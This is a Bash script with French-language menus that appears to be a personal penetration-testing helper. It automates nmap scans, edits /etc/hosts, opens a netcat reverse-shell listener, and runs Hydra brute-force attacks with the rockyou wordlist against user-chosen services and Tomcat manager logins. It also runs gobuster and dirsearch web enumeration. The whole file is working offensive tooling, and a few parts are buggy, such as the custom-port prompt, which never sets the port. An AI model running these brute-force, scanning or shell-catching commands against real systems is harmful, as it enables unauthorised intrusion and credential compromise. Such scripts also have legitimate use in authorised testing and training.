#!/bin/bash

##### GLOBAL VARS #####
data_dir="data"
wordlist_dir="wordlist"
header="$data_dir/header"
report_dir="report"

##### MESSAGES #####
msg_start_standard_nmap="Lancement du scan nmap sur les ports standards.\n"
msg_start_all_port_nmap="Lancement du scan nmap sur tous les ports.\n"
err_cant_ping_target="Vérifiez votre connectivité puis appuyez sur entrée pour recommencer."

##### FONCTIONS #####

# Clear screen
function clearScr() {
	clear
	cat $header
}

# Network tests
function networkTest() {
    clearScr
    echo -e "Tests réseaux\n\n1. Ping + nmap ports standards\n2. Ping + nmap tous les ports\n3. Nmap ports standards sans ping + consider alive\n4. Nmap tous les ports sans ping + consider alive\n"
    read -p "Choix : " choix

    # Ping + standard nmap
    if [[ $choix == "1" ]]
    then
        while [[ 1==1 ]]
        do
            clearScr
            echo -e "Scan de la cible ($target_ip)\n"
            if ping -c 4 $target_ip > /dev/null
                then
                    echo  "Ping réussi."
                    sleep 1  && echo -e $msg_start_standard_nmap
                    nmap -sC -sV $target_ip | tee $report_dir/nmap_report && read wait && break
                else
                    echo "Echec du ping."
                    read -p $err_cant_ping_target tmp
            fi
        done
    # Ping + all nmap
    elif [[ $choix == "2" ]]
    then
        while [[ 1==1 ]]
        do
            clearScr
            echo -e "Scan de la cible ($target_ip)\n"
            if ping -c 4 $target_ip > /dev/null
            then
                echo  "Ping réussi."
                sleep 1  && echo -e $msg_start_all_port_nmap
                nmap -sC -sV -p- $target_ip | tee $report_dir/nmap_report && read wait && break
            else
                echo "Echec du ping."
                read -p $err_cant_ping_target tmp
            fi
        done
    # Standard nmap consider alive
    elif [[ $choix == "3" ]]
    then
        clearScr
        sleep 1  && echo -e $msg_start_standard_nmap
        nmap -sC -sV -Pn $target_ip | tee $report_dir/nmap_report && read wait && break
    # All port nmap consider alive
    elif [[ $choix == "4" ]]
    then
        clearScr
        sleep 1  && echo -e $msg_start_all_port_nmap
        nmap -sC -sV -Pn -p- $target_ip | tee $report_dir/nmap_report && read wait && break
    fi

}

function targetInfos() {

    clearScr
    echo -e "Informations de la cible\n"
    read -p "IP : " target_ip
    read -p "Domaine : " target_domain
    read -p "Url : " target_url

}

function hosts() {

    clearScr
    echo -e "Modifier les entrées DNS locales\n\n1. Ajouter le domaine cible\n2. Réinitialiser le fichier hosts et ajouter le domaine cible\n3. Réinitialiser le fichier hosts\n"
    read -p "Choix : " choix

    if [[ $choix == 1 ]]
    then

        if [ -z ${target_url+x} ]; then read -p "Url : " target_url; fi 
        if [ -z ${target_domain+x} ]; then read -p "Domaine : " target_domain; fi 
        sudo tee --append /etc/hosts <<< "$target_ip $target_domain"

    elif [[ $choix == 2 ]]
    then
        if [ -z ${target_url+x} ]; then read -p "Url : " target_url; fi 
        if [ -z ${target_domain+x} ]; then read -p "Domaine : " target_domain; fi
        sudo rm /etc/hosts
        cp /etc/hosts.back /etc/hosts
        sudo tee --append /etc/hosts <<< "$target_ip $target_domain"

    elif [[ $choix == 3 ]]
    then
    
        sudo rm /etc/hosts
        cp /etc/hosts.back /etc/hosts

    fi

}

function reverseShell() {

    clearScr
    echo -e "Reverse shell\n\n1. Port 4444\n2. Custom port\n3. Random port\n"
    read -p "Choix : " choix

    if [[ $choix == 1 ]]
    then
        shell_port=4444
    elif [[ $choix == 2 ]]
    then
        read -p "Port number : " $shell_port
    elif [[ $choix == 3 ]]
    then
        while [[ 1==1 ]]
        do
            shell_port=$(shuf -i 1024-49151 -n 1)
            if ! (( $shell_port == 4444|| $shell_port == 8000 )) ; then break; fi
        done
    fi
    clearScr
    echo -e "Reverse shell address : $(hostname -I | cut -f2 -d' '):$shell_port\n"
    nc -lvnp $shell_port
    read wait

}

function bruteforce(){

    clearScr
    read -p "Server address [service://server[:PORT][/OPT]] : " server
    read -p "Login : " login
    hydra -l $login -P /usr/share/wordlists/rockyou.txt $server | tee $report_dir/hydra_report
    read wait

}

function webTests() {

    clearScr
    if [ -z ${target_url+x} ]; then read -p "Url : " target_url; fi 
    if [ -z ${target_domain+x} ]; then read -p "Domaine : " target_domain; fi 
    clearScr
    echo -e "Tests Webs\n\n1.Enumération de répertoires (Dirsearch)\n2. Enumération de répertoires (Gobuster)\n3. Enumération de sous-domaines (Gobuster)\n4. Curl\n5. Tomcat\n"
    read -p "Choix : " choix

    if [[ $choix == 1 ]]
    then
        clearScr
        dirsearch -u $target_url | tee $report_dir/dirsearch_subdir_report
        read wait
    elif [[ $choix == 2 ]]
    then
        clearScr
        gobuster dir -u $target_url -w $wordlist_dir/web_subdirectories.txt | tee $report_dir/gobuster_subdir_report
        read wait
    elif [[ $choix == 3 ]]
    then
        clearScr
        gobuster dns -d $target_domain -w $wordlist_dir/subdomain.txt | tee $report_dir/gobuster_subdomains_report
        read wait
    elif [[ $choix == 4 ]]
    then
        clearScr
        curl -v $target_url | tee $report_dir/curl_report
        read wait
    elif [[ $choix == 5 ]]
    then
        clearScr
        echo "hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt $target_url/manager/html"
        hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt $target_url/manager/html
        read wait
    fi

}


function menu() {

    if [ ! -d "$report_dir" ]; then mkdir $report_dir; fi
    if [ ! -d "$wordlist_dir" ]; then mkdir $wordlist_dir; fi
    if [ ! -f "$wordlist_dir/web_subdirectories.txt" ]; then wget https://raw.githubusercontent.com/aels/subdirectories-discover/main/dsstorewordlist.txt -O $wordlist_dir/web_subdirectories.txt; fi
    if [ ! -f "$wordlist_dir/subdomain.txt" ]; then wget https://raw.githubusercontent.com/danTaler/WordLists/master/Subdomain.txt -O $wordlist_dir/subdomain.txt; fi


    while [[ 1==1 ]]
    do
        clearScr
        echo -e "1. Informations de la cible\n2. Tests réseaux\n3. Tests webs\n4. Reverse shell\n5. Bruteforce\n6. Editer DNS\n0. Quitter\n"
        read -p "Choix : " choix

        if [[ $choix == 1 ]]; then targetInfos
        elif [[ $choix == 2 ]]; then networkTest
        elif [[ $choix == 3 ]]; then webTests
        elif [[ $choix == 4 ]]; then reverseShell
        elif [[ $choix == 5 ]]; then bruteforce
        elif [[ $choix == 6 ]]; then hosts
        elif [[ $choix == 0 ]]; then break; fi
    done

}

##### MAIN #####

menu
echo -e "target_ip: $target_ip\ntarget_url:$target_url" > $report_dir/target_report
clearScr
ls -l $report_dir
